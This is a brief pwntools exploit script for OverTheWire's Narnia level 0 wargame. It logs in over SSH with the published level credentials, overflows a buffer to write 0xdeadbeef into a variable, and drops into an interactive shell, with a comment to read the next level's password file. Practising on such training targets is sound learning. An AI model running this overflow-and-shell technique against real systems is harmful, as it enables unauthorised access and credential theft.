#!/usr/bin/python
# Exploits a buffer overflow vulnerability to change the value of `val` to
# 0xdeadbeef.

# import all modules and commands from pwntools
from pwn import *

# Set the context for the target platform
context.update(arch='amd64', os='linux')

# The value to change `val` to
val = p32(0xdeadbeef)

# Connect to the remote host
session = ssh(user='narnia0', port=2226, host='narnia.labs.overthewire.org',password='narnia0')

# Send the exploit to the executable
io = session.process('/narnia/narnia0')
io.send(cyclic(20) + val)

# Allows us to interact with the terminal
# enter: cat /etc/narnia_pass/narnia1
io.interactive()
